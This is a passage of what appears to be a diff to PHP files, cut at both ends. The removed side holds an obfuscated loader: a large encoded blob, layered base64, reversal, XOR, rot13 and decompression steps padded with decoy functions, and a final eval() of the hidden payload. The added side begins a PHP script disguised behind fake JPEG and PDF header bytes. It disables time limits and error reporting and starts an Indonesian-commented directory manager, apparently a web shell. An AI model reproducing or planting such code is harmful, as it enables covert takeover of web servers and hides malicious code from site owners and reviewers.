2Y3kEb?lp0UHVS?QGZuWRh?XBFFna1?oAcXMDR?WlhW39c?WUB+RQd?tRGRSW1?YGeBxZQ?l55B0BL?fnFkXRh?nfWgcVV?FJdnVER?nhGcH5P?RmlVXmF?rCVJ7fW?VBeFlSU?WBWZVhW?Q2dYGH1?aBVFaXV?FqAwJgY?F8FR3sc?eVQcQmd?UcGZyUV?91BXZgW?VxufFJd?blVcUlg?cSX1gdE?FBdgdmU?FVqHGJO?XQpSU3h?WaVx4UU?NnV3V1f?kB8cFFG?SwUDWRh?Gdnd8BV?tpVUR8X?X97AkBH?BQJ1fll?fVl1QRX?BRcnZZa?1V8B0F1?Agp5QlJ?ESlx9f0?BLcHx3B?2J5QEVT?Ql1SdWd?yVwJ9Cg?N2ClB/U?FBUA1IA?Xl5DBGd?9XlFBdB?x4a30PW?nhnQn5/?dhxHQGZ?Gd2FaYw?pkZ1ZbW?UlhckR1?dndnB1Z?KZ1BCSU?ZJXXZWB?117C2JE?UFlpW1x?EAEF/AX?0Ga3Jjf?HpSc1JB?eF9YZQs?HGFBSZ3?scVWlCY?GUBbWJk?QBxrR2V?kX1VAZG?tjVAQGX?1oHfl0A?Q1ZZaQM?BRkJwY0?tLchxxW?FJjWWdy?ClRkbnJ?CXFJLCk?VzR2RlB?lsKA3pg?RAJBaX0?EQEBJZm?N2Z1tza?lIDWVJU?A3FiQVp?cQnVzdX?0GU3ppW?kJzAERf?VUBBd21?6akl7dx?xlfXVhY?0J+QXRx?C15jYnF?QdmNZVl?5UYH5kT?ntlclUD?QAhbf39?ie0NKBk?5bWVlZR?mEeAApf?VQ5gRUR?ge3lWeU?FcY3VSZ?lRVX3Ra?URh8BlV?aAF4OaX?BfeVkGQ?nFCQnsc?AXUEZmt?FHmJ8aX?8FXAB2X?WpBe21L?Wn5yVWZ?UdVp9VV?tpAFhzQ?AF2dgte?QXJQZAZ?heAd8Dw?UHc3BAQ?kl8B0oa?f0RlZER?rS1pcUF?pQYUZ8B?lx6RFMc?A1JJT0Z?Ga00YaR?5cdX57A?EdReGQL?AHJURwZ?cYllifH?16S3x1Z?nBYRBxl?QxhccQN?4Q0kIZn?5GYF51A?wRxeVkB?QX1bAkJ?0dkJtah?wecmFqR?05nQEl+?XBhQdEB?4dWN+fH?wcahxcY?QBcUE5c?QXUcckJ?9cnlfeH?l/Y3IYZ?nVpWgFJ?a2FrV3U?YSgJ3A3?5aCBxDf?X1nBUBo?WlBWRF4?GeX1/AG?FfX15qf?mZmfUhQ?d3Z2WH9?5SABZVg?hhYgRFB?hxed2ND?cgJxaVd?iQANgBw?ULWUcAd?XFmYWdA?WAACBHd?1aXkFBE?FaABxmB?3lAVVBk?XAIcUkd?8VmVYRn?ZBdVJCf?gN1ZANi?dEReWwZ?UYgJwQk?NvYEVdD?nFBYA4L?XkF8enB?1WgV6CW?JjW0YEW?WVzcUJG?VG1fCkF?8UWIHTk?ZCAXpaa?1MEd0FU?Rl5KCHZ?yfwlaXh?xAVHlFc?n8YcWNl?dF5EQVl?eW2EcdF?RNZBxUR?FlARUJW?CmFtGAU?HXWIcCX?BrRgBYd?kBXWHsK?Q154SnJ?8CkF9eU?EBRUVga?1ZzeWlU?XVteR3Y?CXHtbeE?BnZGQBW?QYFUV17?QEB2Z11?6YgB5fR?4cdUZde?2ZEcAR6?UAZxQXZ?VdklxBX?xLXUZRB?hhzYQBn?aHxwdgJ?xCnV4YB?hxAEMcd?XhuBXV7?VGZWAmZ?6UmdiCl?J6AHZSa?XBYQlV/?cVV2YGR?kdnlrBE?dGBQJlY?HAFSW1A?SwZgVF0?DX1tGRm?AKYVMBQ?FEBRUVG?A2VSY1R?uX3AIRA?oYVH9iB?FhTYkNo?ZUMKewA?FCgZfXF?J4dlxaV?hgLSwJZ?BkcGWHB?yaFpFZ3?kBclxTQ?1tedVkH?ZXdeHEk?GBV0ACA?ADXAVQc?QdbQFpY?eWRQVFo?FdwBFD1?xfCHMDA?kgPVEVA?ZWQCRl9?UUHsDB2?lBBmZiV?QJAAHAD?emN7HER?ARBhaBg?NhewpXX?gJ1An4D?AGh0a2N?dUHFyWm?9+AGFaR?WdceWRb?eU1GXFh?4QwEHTX?J6BgBCf?WNNfgoG?eVQGeH9?LeERyBX?FFWgJ8Q?313dxp8?QVBQAnR?FS3t+ZA?VYW3F/W?39FSXBw?YAdUBhx?3ZGtbBW?RgSQBRA?nBGWUph?RQFkcWB?QBQAAWw?p3QX9YU?GB4Vlse?Y0lGWEA?EfgRZa0?pEbndCY?k0La10D?YAtJQ0o?cWQZ6VX?lfGEVZQ?wZCZ09Z?YB51S0F?rBV5SaA?dSQVVWW?2IIVAF4?GnFUdQF?fHAYAfg?FQSHNSA?H9SAkpH?eUVJW1k?DVGRYUF?9zW3kHY?k5cXgZz?Bn0HVmZ?+QWZnWw?BySRhGc?wNqBF9f?HANnVUp?eAUZ1eV?x8Sl1RV?gpaYHxd?W3J0Rld?ZdHddD1?5eVlV3f?FdRXmlD?eHFbA1R?kBFphSn?1pbhhZS?URZWAFd?XGp8YFp?JVn5Lem?ZSRQJke?1lkQ3B6?XnIOal4?EU3BdB2?9FQABCa?QsCe0kc?R2ACXnk?DGGVddE?Bacw4YY?FN5VQFV?QFh4enV?lQgMHUl?hBWlRGd?gd9Z0JQ?YEp3R1A?CX10HCg?BiYgICB?Xl6QVlV?egdvBwV?zBnccUl?xZQl4HV?1cCB0ME?S35VSkB?SRkl0QH?ZqA2B7A?lpxAnJI?dlgCcn1?dYxpDGF?lHUXt5A?kJ/Qh5G?ZlQeT2p?aQxwLcg?R7dwRkX?WdXYl5Y?WUUBeFZ?JT1RbdU?B6S19jS?n1rWXh9?X3hLWX1?7HHlyXw?dhVGVGZ?hp/AHdm?YQdFem9?8ZlZOe1?9wQ0kDd?1kBe3AP?V0RUdEB?gAgN3Uh?oPRkRAA?FZcdmRX?BVQEVXZ?eX0NLfW?dVHGZda?QRiXXp1?GkNRAlp?Qd1R4U0?VmVX9mW?ngHSWRp?bQcCRUZ?HAwJEeF?RaAQRkZ?FILAlxt?Bn53ZGt?kBF0De3?QOZ3ZWZ?3YcdGQc?B1MDRUB?YQ111dX?1BRWNvZ?0tcT2Zf?CV9gewB?YfAZARV?hCc2J7d?FBmYn58?RwZBdXE?EaQRGC2?BYAkN3Q?FBFC3Ne?BWdkZl1?BAhh2A1?5xf0BiB?11pAQBa?SnRjBnd?CQgBAdF?VCeGJve?FUIW0FF?Z1EFVkN?OVxx8AH?9VAwV6f?lJCA11I?VldKGgR?FY3lBV3?pbUGRLW?3paQ31R?VF19Ukp?rawVdZg?NYBmMDW?VBxYVhG?YgZQd2Q?GUHtSWn?0HC1lka?1wCZ0AK?ekIBAV9?ifER7U0?QHewIHR?mJvHAdh?U2BlBX9?fSwVfdh?h/cGlYe?HsEBl10?a0IAc0p?fVVBAB1?50GEl8f?WJnf3Bi?Rh5dZkE?CTXxjaX?UYSmUOB?2J3cV1R?aRh5VVp?FYn4FZl?ocREIAB?FBFRHFz?AnZWe0N?nQGNvfg?N/ZHhXQ?XYYXlN9?Z2BfWVl?cYGdrXg?EBUmBXR?3Vge1lp?eWNaQlF?bfkZXdR?hqSkZPR?EFGeX99?ZGV8BVt?1Cmppe3?thR1JZR?AgYVH1c?dlV/XHZ?3GElaX3?x4T1BHd?HxZUEJN?VEBFdBx?iY1MDBm?RPZ1Zpe?UpnaFxe?dV1yY0Z?JBmlXRG?BgBXlTV?1FUY1hb?CQdAS2t?Gd2QAdR?gGRG12A?npxRHVI?fwBEX0d?ranVhAw?NpB1IAQ?mIGWhpS?CkZSBGF?kaV57f2?VUSntgB?HliW2V/?VlIGClx?gWXhRAX?liZlVte?Xtwf3Vh?RFtfQUV?ldUB6Rm?NRWmVHB?F92Q3h8?bkR/Vl9?ndnxCBl?dLTV1pA?25QXQVv?YgR4A2U?FdUZXcl?9CR2dWf?WcBY2dh?UV9bald?EXXgKcH?xkQ0FDU?FddWEVQ?eVRnX2B?BRmF+Tl?pyaHxSf?l9DZllI?B2tea1g?LWnt1VX?FiYHthe?FlZCl4O?XhgaBGV?dWGRFRm?BjXmRVA?AFdfHJH?Qn0BfUo?CWER5Xk?Z2XHB+Z?mdFY10c?e2Z+S3t?nV0IARW?t0QUddc?H0BS2VF?RwAHA15?YAHAPUH?5bWFxYe?VNbXVYG?Q2RBdWB?kekRmdE?YEB2lVR?l5CVRhc?fVR2AwR?CQkZBc2?4AcEkOZ?XVadHl1?fU5cXAV?DHF9geg?F5Bn50X?FQBdlZF?Qlx8Vhx?FaUEDdm?ZFBXJHV?3l+YWV8?Znl0RFd?cVF0HaU?B5VkViW?nVHfkJ0?RUV5dXZ?cbl5lXn?8Ed3tjY?nxJfkZn?RlkCQ1t?yQwtDeV?9gRnpca?31AY0lV?VQJDd0R?ZdVBwRU?trQV1ZB?WRxUGti?SUVLfFp?hX3taBn?5mdWtQB?2YGSFRx?R3JFdlV?LBUoCXQ?5LfEVPf?wpHR3IY?Yl1JVEA?DX3caZW?tQCVxGB?kZ1C2Nb?YgMFQnF?pA2leeU?RXdEVxf?wB3eQNu?XkllTlB?XGlIEZn?wEQ2IAR?2tcBmdY?dmlNZUZ?TVGFEdU?IKVQlbZ?Ud6YWtX?dFECalh?+Z1ZTAF?9/QmF3Y?10HfmR4?c3RRXW1?2fRpYYk?lXfFQBC?WJSBXJY?CnZLfmJ?5awZjW0?IFYEcEb?QpJfXAL?Q1ljeHF?AZGd+e2?FaVXMCQ?0pjR3AE?RX8CBmF?7fmAGdV?VJYlpmR?3dOVlYC?D3YAYmE?YAXxBfn?t0dlxdf?kMcQltb?AkdaWFB?mB3UERm?ZzcRxCX?QtiegFi?cAZGf2N?1BHZFZF?kCUkdvU?EJfD1dV?A2NUalh?PAEAEXH?9ecERVR?EMEClAe?BBxqA18?GHB4Ed1?wGX0RbB?HVfZEgO?BFlSW0d?DS15JZH?xuQnJcW?3VfYwRc?QGEDfn4?AUEoGVU?dFBhpOe?2oFGFpG?QRhLaXw?Yal5+cw?BSSXxcB?X0CfQdy?ZwRna3R?fGAh6AV?pGBVAFA?AJyfFVV?C1EJbWt?UdkR8HF?JCVgAGY?0cCZ3oD?XlldR2l?kXkUCeV?9ben5gH?F9ocFtK?Uw9ZZ2d?mUklpHF?RhWhxAf?ndOC0d+?cEd9dE5?mBEgDQE?FTf0IFe?lIcdX9+?C2VIR0U?DVWZ0YU?BTVQEeY?0Jcd2QC?cGt4YXp?LYlxHSX?t4Bn16e?VxhBFBL?U31waWh?QZUlcf3?5WU3R+Y?VpVcUV4?cXZ9fAV?qXQNBZU?oHYH53R?Hl0Q1hV?UgBaQEA?Fc3sGek?l8Ul12e?l5BQ0Vb?eBpCWFt?obhhdQ1?RVV1Byc?kVIVmR1?aFQGZwE?FfFl0T2?NXCFBBW?QRyQAYC?D0teV1Z?DcHIPBE?NldlFqY?GccS1Vt?XEddBXF?wGnBFeU?JPamt9T?Qt5BVt1?dnRuSRw?EAmNkfh?hWYGZtA?HhGTwoD?B05qa2F?RemtSeH?wBAX54Z?X8ce3p0?VHtRXHp?EWAZ0WG?BnQWFmY?gEYcXth?BX5/eEB?0dUZ+Al?V6GFdTV?XpBS3NA?fUVfBlh?SUEkDBE?BSclcCW?WYBQlUB?QnlFXQV?GV2R/Wg?N0fnBBc?EVZQUJb?c2NKBUQ?DVwhFBF?BDYgYLY?VYcC0Nh?VXFBcVl?KcEBDdX?MPB0IBU?llFSxx0?ZFUCZ2l?/XEF6AQ?AEWUNbe?nFzdmdS?cw5DRgc?HVngeAV?BEawECX?np0QAtW?fnh1cgM?cR0YBag?EeTkVLe?WZSUUtw?enZ9Tlh?hVnxVZ1?hFHAdcV?nJyAA4D?XlJHRUl?oRWJDWQ?RJfQAOA?WpbfnBq?aHpjcAF?Sd3pAYl?l3VwF5C?lQOVXx0?dktwXkN?dBFYEdG?dSW0lrX?35BdkB1?Yn4AfVh?KBXIce2?tid38AA?lhZe1hK?BXRVAGB?6BGNRB1?9+YkYBW?AJleWd8?V1hmZUh?BY0FcfF?JeA08AW?EhRfkBU?ZnF4X3R?dQAdmZm?JHYkRQY?E56QHNY?f3IJW0J?1B1ppHF?xDCgd+f?HkAR1V9?SgRUY1h?GXn12fH?sDRlx6f?HF9T3pe?ZXN9Z3V?6Z2lpY2?dAcnp/e?ERSeWF1?QmFqSH9?aV3JtB0?MaZXJ+a?24Ye0Zz?cmZcWXx?bY0N7Ql?9lVwtHV?nBxA0Jj?dH5iBGl?TdFdSCF?ECZ0N4V?V0DXRhW?fGdWcAV?+dn5wdl?hjZUJgV?GheYwZc?VgBraEM?Af0BRUH?AeBFFmR?RwCa2FP?YnxZWwo?DZlB9RE?h9e1ZbB?kN1YRhj?C3J9d3d?9XFZeB3?NxRQUHB?n1FbmdB?CVoCQEV?EcgdbdB?xlfwZbe?Fh4UXcH?XkQccBx?mfkZha3?dfeXlUU?1V7Clx6?flAAbmI?ACVBZfX?ZwalsDD?lULWlkK?e2tZBVt?iBnV3Y0?cGdF1GY?GZoWWRa?B3hJWUk?PSkt9Ul?kKUEFbS?2J2ZWVw?ewoHaEQ?DA3xkQF?YaXV1Ye?0RCBmZ1?AGdHBgF?UQEZ7R1?MFBFVZf?UpWAgJ9?BgFUS1h?fZAAHSV?VQfUtNe?AVaZFZH?VgNZWnQ?HAGV3eg?sKRWZmf?lgBWFJr?TV17SH0?BWxocfh?wIGEdfc?wBndUNR?VwdpWUV?Yf0FQBU?hSSllYW?ndwcxx4?A2Fxf34?JeX5Zdn?xdSlxYA?mF4R3wB?cER3f1p?VfXd9cX?F0V2JGU?UJlYAJD?cAZ1Vk0?EVlh5VW?NdfkFDS?QZYVnZi?Y1R4eWN?eAkdkBE?VSS2YHA?0J+R2V9?A3Vyfll?zB3ZZXU?5eRH1CX?1BLW3B7?RVBxRnR?keAMHUH?1UA0ALY?GhOAQFG?eVJndn5?AB1x9S3?ZyYwUBZ?X5xC3Z/?RXlST0R?FcFpYcU?d8HH92Y?QByYwdR?HARYW3x?UAUAYRX?9LeQh0a?kdoD2tD?BH55AVB?FVmZfVB?xQXFtiX?2FFdwRj?U3BLZF9?jdwFGdF?F4WGZSU?EN0fXVS?ZARFXgN?iVHtLBX?NWZAsJQ?AdfRFNZ?WEECWAZ?7cWZlB3?pCa1pZS?nhbUnp2?emYCYwN?WRVB2Zm?ZgQVpFZ?nBaAwQI?GEsEYkI?cAUkAcg?NyXHFAd?1x8BUd4?CmBVU2N?WeHQBeg?ZZfwtAQ?npXVgdR?X2J+QXB?AXHpWVX?8cf1pkZ?EEAVXoK?VkEBS0d?AABxyAG?VbS3YCf?wl+f2ZD?XlBRX0R?nVFhPS3?lbUmRXQ?1hrGHtc?fGFBXUl?+CXhkRg?F5B1x/A?kt5eAdg?Al0EZnx?oRXtgaW?B9UWN/C?3BpdHRK?S1JUX18?GQkkGfm?RmeAJCZ?0AFY2VZ?XnpQeVF?xd1xFcV?F6QXsce?HVBVAZz?dXlXYnx?LdAZQZF?JPAX9VU?3V0XHRp?e0JifUB?aZnliHk?NiVWJAV?ndhbWkE?WnpSGEB?fUlcaQ1?ZgRFVxZ?ABQcGl5?bWJeHhx?QdEkDdF?RCUhgBc?1xEcX9S?dwdAQ1Z?jWVxXCg?BjYUV6Y?XVpQ2cA?VUBiHEN?XDkpnRw?F9VXdcf?XFmWXtA?YFUYXkZ?PUXlYQE?lHA0J1Y?3hHAUtE?BwJgVhx?ya3BSa3?tmXlBVf?X5GfQVm?Y1phc3Z?Ke2BbXE?d2VloID?gJ0ZH99?f15iZUN?BAFZbCF?ReXFBFC?gN0dRgL?aHYcGF4?Bchx4QV?1VCVtBU?HN4AV5Z?A1dqVhx?+dwJiHH?gJWkYcX?H98AVx7?ZFlfT1x?7Yw8DcH?dDQkd4R?l1ES2Zm?ZnkGZ2Z?lZ2ZyQV?V4aVB1S?wt7eGVH?V1IYYmF?AAX95YF?JUGlocW?gldenwJ?BUAGGmF?0cQcHAF?JCDgNbB?lNwSgF4?cl0JZEA?CZ2JyVE?FGBWJke?wRBX09F?VH5hZEN?JX35ya2?dlenB2V?nlJWwBh?flJERgU?HeEZoXn?4EQn9ed?0B+anoD?ZUlfaHQ?YCx54GH?Rgb3BKd?XlmR3lA?dAJDYWo?AXQJDYF?cBZnEeY?1VJcE8E?BQdWVQN?ocgp1RU?UDUX1iH?F1QQUlF?VlZRe0V?/UnlgVW?pmUlR0f?Qd8elRU?fHRcGm1?bdFxtVg?JYX1RaW?EV5AHhT?X0FUAUN?KUEVaam?cBdGt7e?3tkQnIc?AGluYXd?jQVBffn?ELQ1gOA?xgHRkEL?WWV2Rwh?9HAV1RX?p9emcEY?1xFYFti?QldJdEd?EAQZRcg?BmBltDV?Ud4Qmhm?WHtEfnE?BREBxdF?VRBld+D?kpDWFUc?RV5ZSgB?5cHdHRm?9GWHRVS?0V9eWpF?BlBURX9?FdgtGRE?d/RwcHX?3deR2QG?GHUKAVx?4QnVjcl?9cBnVyc?04CS2NR?f0tcYUV?WAQEDZH?1iZVUJZ?1ZYf211?XwQPAwd?BX3p8fn?9raWkYA?HxpYAsD?XFJnBnx?tXVJocV?ELUwN6C?1pbSwFS?VWFiZlt?KUX1HXQ?tfD3xRf?E1QREhG?cAtyRgt?EeHlXYX?Nua1AJB?AdiWlBf?UFVSagZ?lflJaAE?J2QAgOW?mNSXH5J?fn5UYnt?6YlFJdH?J1fXRXd?1xhBVV+?XXFxeQZ?7V3NjAV?VrcUVUA?UZKX3NY?URx+ABx?7UlhGSW?Vnd0RlU?EdwUAJC?YXB6WWV?DUUUEUw?IBQkFWe?nh9RGlZ?VU9dYQh?RUGJ8VE?JiUHJ8U?QZaeltY?AXddX34?HRlVNYl?hlY0MAc?kQKSUNZ?BwJybmU?GZlJeBH?MGfHtSY?3h3WFhA?BXd9Wnc?aTllecn?EAR1sBC?0NyA2Z8?eBx1YnB?RWHcEUQ?FnZwZ6f?Ul7AWZk?RXRAdVF?5dllzUn?hbfxxCY?npSdwgF?QnZde1x?gBH1aAF?tESmoaR?BhgYAUG?ZEFccEd?2U2tqCF?scVlxQV?2lnQHwH?f0FhHAY?HVgUBQF?hHfU5nH?EUOVl59?UQNUaWV?cQ0AHAl?pdQGRHV?g4cXn5e?QQNJTmt?4XnBESm?Bla2QDY?11xYAYL?CgBldhh?HVFh/Am?VRGHNyU?GpJGGph?SWRYXFY?PXGNwQH?RiY0JwX?WccR2ZB?dl5kV05?RYn1WUV?UDAkVYY?35EUnpd?GEFIHGR?aV1kFdU?kDQRh9c?FlEVUBb?QghPXnF?ebQJHex?xGB0JNY?2BaTgd2?aXpyflJ?FB0ViDm?ZbQXp7C?mJzAn5I?UVUYaX8?BC2BcXV?ZlbVRCY?15DA2Ze?Z0IBUkl?bCQUEUk?J1CgdaA?gpxckFJ?AQVgB1J?nZFBhQ3?pdQF9SX?XV6WVdh?VkdWYlV?AX0tnWV?4HSQcGd?WMOHHxm?A2IFZFE?CcHNRfG?llAmBbX?2NVZgNR?XEAeVVI?CfANqcX?V1HFFyc?VpYR04L?a1NNGHt?LVXBASG?Z9R11+Q?UVHUnt4?fm8BBAl?UanseRn?dGAgFQf?0dmBkR9?QEFCV11?LAXVTXF?pSZgpAH?lVLBHIE?BxwFfH5?dSH1wRW?h0AGRGW?GNmaENC?VXpGSV8?Jf11KWG?VdXmlYR?Wp0U3hL?aFBRcgl?baQtAGF?4DZxhpA?XNtV1ZQ?YXd9XVB?DBlRzam?BXWXhWX?U1jSWFS?RGRAAXJ?rdntmXl?BSSwB7f?mVEUnV7?WEVidnR?Lc1RjVG?NUZQljW?moIe1Rl?aGNXeXx?9aXtwVm?R8XU5Ga?2UABUFe?R1EGQ2F?dRn56W2?ZnYGRra?U5qUUtb?f1p5VGJ?rWwRQdn?lCUAsGA?X1eS3xq?X1RmHEZ?bXlR5WV?ViQXVuf?npIZVlk?B3FJQ2k?EeGFhdg?cEQUFdQ?F9uXlgF?UnZ3d29?8REBhAV?poAXZ/W?XtQenB5?R2BlZGd?dfEEKdH?Bia1UJd?HYYX0ZD?R2J/UXF?pb0ZXdH?4AZVRHW?mkaRGln?R2ccQXl?Gd2N8en?5CcE5jU?QZ5aUJ/?f194YH9?fcV50dX?IIA1p/X?FVgV2N/?C19TQgp?3Z31gQG?lEBV9TY?F9LVAdC?Bwd8UV1?IVWdCHn?JEf1MCW?gp3ZVlU?eVN9f3x?UR1JTb0?t8YnJ7W?HpRa3pr?WgNcQkZ?nVnBBB2?phDlYAc?kZZBn8Y?QgpVYGZ?wBwFcQE?MOWVx/B?V4LVX57?RQNCZFZ?acwNxAA?B1amUcf?XpJWkd5?ck9bQ1I?cVWQCU3?96V0QFa?1gAf2ln?A2plXmd?HXURWAW?RDdAp+Z?kFqBV1E?e3hFHHY?cQVZ3RX?98SRxXW?XthBH8F?f1x8cnJ?4eQJmaQ?FrC2Zwa?1BneXYD?dGFKV30?YcUdCVV?FlRWFqV?x5NUH9F?dEFjaVA?LAgdxY1?1YfVl9d?nxCWWFS?WABEeXt?8eQ5iAV?B5cEV/f?3oDe1JU?VGhYVFc?IXWRHA1?1AaghAf?WJBQQZW?SX0EZBp?7dgRGBl?lZW0RhQ?VcERFoa?TUdFVWJ?LC1dTWR?geZ3ECf?lN4A1Nn?S3pmRGd?HXXVjXm?BdXFdhU?kdYYkZd?YEduQgN?ddAVBfU?8FSkJGW?Qd8VlB0?BkF8W2R?fVBh8Xn?pASE5VW?EtHAWRj?YUBeen9?HeFtyRQ?VcQwRjQ?lB5XgVC?dGVYDmp?8eA4HC1?1gCl9dT?2djdU9R?C391UVV?+UVVAQF?JAVHcBH?AVJVQBV?RnQKYFh?WQ35FZm?Z3CBwDW?gd1VwF8?QF9gCHs?FYkdFdw?J+X1FRZ?3BqeQlD?UgNceVp?lYnhEVV?BFBwt1T?1xbY1VC?ekVbZQF?XBkVxQQ?R+XFIHc?kYEblVx?Ulpie11?/RUZ4W0?NkVAUES?nhzA2Ri?YVkHYmN?Ua2RRYF?ZBfgN9f?35iYB5N?UWcBQWd?7CFt3eG?AEYhx4A?Wt6BgZh?BGFmUAV?5VFJ7ZF?VWYUBOX?1hkRmBK?RVNZZUM?GA0pCfX?twfmJ/Y?0BUZ2YA?dUdrBVF?AW3NCfG?F9AndaW?E9Ze1MC?exxhBBx?ickNjYH?hRB2J8T?Wt6fkVG?fURdeH1?Zb0daWk?5nC2tdc?XBrdWJZ?WEVJWkh?bShxFR2?F3RA5Af?3l8elZJ?ZH92SGV?LYUV/eF?kJBEcCY?E5wd19i?WXVUcgJ?QX3BKAQ?JldgEEA?l4GQ1hL?fltyVEB?QR392c1?1Bdmlvd?34aBXEA?U1tlSUl?0flJbfB?xCd0BJd?3tYf1hF?Q34KS0d?EYENta3?5HGH97f?lVSfBph?RnxWbnR?ZR3F2fU?dWUXthd?ktKf2J2?e2FGfXx?mcQJgaH?FVY2NPU?Ut8f2p2?aH9gBHZ?hRV5feE?N9XkADB?WtvRFd2?fl0ERXt?Xa39dZF?tTR1cLQ?XkKUFt8?a3dHQwp?2eFZ9HA?ZudVF8f?wVFeVIB?RXhhVgp?QAkdhaV?RQWWtuf?Wpcb3cH?ZHF9ZWc?OX3h4BG?tYYU5LW?HNCXVkA?RV0YYXt?UUgBlR1?QFVVdaY?VJUSmBV?fQJ6ZlF?mV35lWH?0BUEB1R?ABWXUED?cHZ5V1d?jWgFwR1?RJWmd+e?3AGVWdK?YQR9Y1k?CXgF0Tm?BBVV9BS?WFdVWVI?Q3hhU25?YVmAYaV?IEZ2NqZ?09hUVRc?S2AFZwp?JXX5nYV?9DQGVjc?X5RAXBA?UHZnGEU?GQgphBU?9EVF5De?QF8Dklr?ZXJSfHR?0GEVBXx?h4c2Vrd?mQGAV4I?UGpja3B?AS0IDa3?BIWUt2Y?mdaZQV7?R19nen5?cfXZkX0?lZHBhIU?klUBFoc?eH9jWVA?HGEJhQl?oDWQBnV?UN0TVsD?CE5RXVx?cYwFGZU?AFXngYX?H8AQX94?XWVlRll?bUkQBV3?Z3Tl5kS?GccA0Nx?aQBmGH4?ccm5LQW?RlWEEFb?lBEWQMC?agNlBGB?CYnh5XV?ZdZHdgR?3JLBFJD?emIFRwY?EVHgHAX?xpdHNYZ?1tZXlha?fn4Ld19?qZHJ7VG?AHYBhFf?gNCVUVG?YH1UeXV?wcw9WcE?V1fHldB?UlcUk0D?WgIYfFo?eYlp4YV?UCA0VCB?HEBYX15?R1FHVXZ?WYFFVQA?tSY01Ba?VN7C2l9?f0N/Wk8?LY2tWC0?VhA2B6G?l9EeHUA?Z1hdTwd?xf2BZX1?1tBkZ7B?wF2Z1Rp?cAJUXF9?LHBxGRk?0LC0lDA?hxEYGJq?QwB0Rho?OBl4CVm?EcBl0FA?wdWZHhe?WFZbHhh?5S39ydl?9QWXBGR?1RKQl0O?AH9yYVs?AXmJ7Q1?BwawRwb?kJiQVxR?B1x8GGt?VYEVQf1?hpR1VtU?WV2WRh5?QUZgQwk?ACnlydm?NAf2JhW?18cHFx+?bUt7WlZ?WandEWH?d8c0JAV?GNlfnRu?BFVhfVp?0WgMBfQ?diBgoaQ?gt0RFsF?YWZaUlI?GRkZ2Qw?4cYQYBd?0YCRBgY?d2cFA3B?CRWlGGF?91RGcCS?QQHWkR4?Z39BXXR?CcHN9cn?9JT19iV?lBFR3p5?fUFhQwF?DSENFW0?l8SX4JZ?HVGcH1H?WH9yGHZ?HWnkcZE?J5QXxDc?kABDgRi?SUdfYgR?lA1hQQ2?ULaGRKd?QhdBmN3?An4KRXA?YZANSV1?oafXQDU?mV9ZQdR?eHBTTlJ?xZXEBew?RPQUtkY?Wd9QmBA?Qx5iVFQ?efFpBdQ?JmcWIYc?mQHHEkA?fHRrWAI?YV0JDDg?NqXxhpU?X4HUndY?BHRFBBh?wUXt5Rx?x7YF1YR?XBwWwle?C2IJdFF?4ZEVZAF?cCCnZkG?HEGBX50?GAkPClh?WbX1DYg?dVenVla?npfXmpm?dg5xcVl?WCgF1Y0?NWcEVlQ?gFbVkln?VENKUn9?eZkV9SX?ECQkIFZ?kUBWXJa?R1xAdkF?wUlVBCk?gBHHBiQ?3xLXgBY?fHdBQkR?cD2N/Wk?QLBgl7c?WEEWXp+?Vm8LAHI?cRXYaHB?xEeHxgZ?VgGQVtX?chhYY1Y?HZFZQdF?9+QXBEX?25AQGJA?VnJVeGE?FUEBBC2?ZWC1UIA?HlwBwYc?Wnp1GAF?XZ1hbZE?0GWXldX?HIIYWN3?c313Z0F?8ZVJ+bU?tUAwZUB?nJaUUQI?GAoLBkZ?CQAZ8XA?sAAkp0W?EQGZUZR?WAF1XVV?lWw57ZA?FicEtXD?1pRBGZY?eAYDS1J?hD3xYXH?RHXklyZ?wIeeGFK?HgN6d3x?uS2JmcE?Ucf0UYV?VhcVGoI?DlkYBV9?2WkACBg?BUfHJBA?XYYBn5+?AVpCGAI?EQEcBAQ?RRcRh8Y?QZfenFJ?UmZyGEl?gYUFjRw?dBVANQQ?wtAdQZB?ZQMLSUM?YAnxdBF?xRVgRcB?0BYVEBU?ZgVZBl4?KW1gDAE?AeBmNWd?g5WcEFf?QHB9RgF?aXHVAW0?FGBnIaf?QBwCVQC?VlxfBBw?aB2BBHh?xAGEIOV?GdbXmpe?XGdcQwA?OBABkZ2?lyCBx2c?GgORGFW?XXByWnE?BHAYYBX?hYBH9eV?FJWcRpY?eAQEAGN?7UwVyVl?8PeXhzV?VVxBAZy?RmlZcl9?IAmZ8Xm?dWRwBZV?HlrQgBp?Zm55Y2l?UXEVLYX?p1Yhx9R?AFvdnha?Yxx/SWR?kQGlNYU?pQAXoEX?XZHYARx?dgFgckV?YQl9aSX?ZuZ2lkA?2kLYE9x?YlhmBGl?icnJkUA?9pXQREf?3JmZ1pp?Zk8KXng?GHBxZVk?kAUl9SA?nRtY2Qe?e31iWHh?wUX4PR3?tJYlJEd?F9SC2Rx?V39/eWF?8Q1pVBG?JfZgcad?V94Akdc?AGRQR0t?SXHVJZ3?NQGF1aB?EkCdXRj?GgJ+XF4?DUX5few?BBdwADR?khgQnoH?UgNceHg?YClIOC3?AHW1xeA?wRUeEJQ?XmRD';
-$EtPUvpJF = str_replace($LMHBLXv, '', $EtPUvpJF);
-function uKkzulb($s){return base64_decode($s);}
-function oLhncMbPS($s){return base64_encode($s);}
-function MgCjaOED($s){return strrev($s);}
-function DlAEuaoYVr($s){return str_rot13($s);}
-function eLFVahGakj($d, $k){$o='';$kl=strlen($k);for($i=0,$l=strlen($d);$i<$l;$i++){$o.=chr(ord($d[$i])^ord($k[$i%$kl]));}return $o;}
-function eZghCwZNN($s){return @gzuncompress($s);}
-function bdlAyydv($x){ $y = md5(uniqid('', true)); if(false){ echo $y; } return $x; }
-function lsIefsvKU($a, $b){ for($i=0; $i<3; $i++){ $a = sha1($a.$b.$i); } return substr($a,0,5); }
-$qsAjNG = bdlAyydv('?');
-$WVRPyb = lsIefsvKU('alpha','beta');
-if($WVRPyb === 'zzzzz'){ echo $qsAjNG; }
-$UcUoobcpt = uKkzulb($EtPUvpJF);
-$UcUoobcpt = MgCjaOED($UcUoobcpt);
-$UcUoobcpt = eLFVahGakj($UcUoobcpt, $xZfZLjFv);
-$UcUoobcpt = DlAEuaoYVr($UcUoobcpt);
-$DlNEI = uKkzulb($UcUoobcpt);
-$DlNEI = eZghCwZNN($DlNEI);
-if($DlNEI!==false){eval($DlNEI);}else{/* failed */}
+2 0 objÿØÿà JFIF      ÿþÿØÿà JFIF      ÿþ<?=
+ob_start();
+session_start();
+@set_time_limit(0);
+@ini_set('max_execution_time', 0);
+error_reporting(0);
+// --- Manajemen Direktori ---
+if (isset($_POST['go_dir'])) {
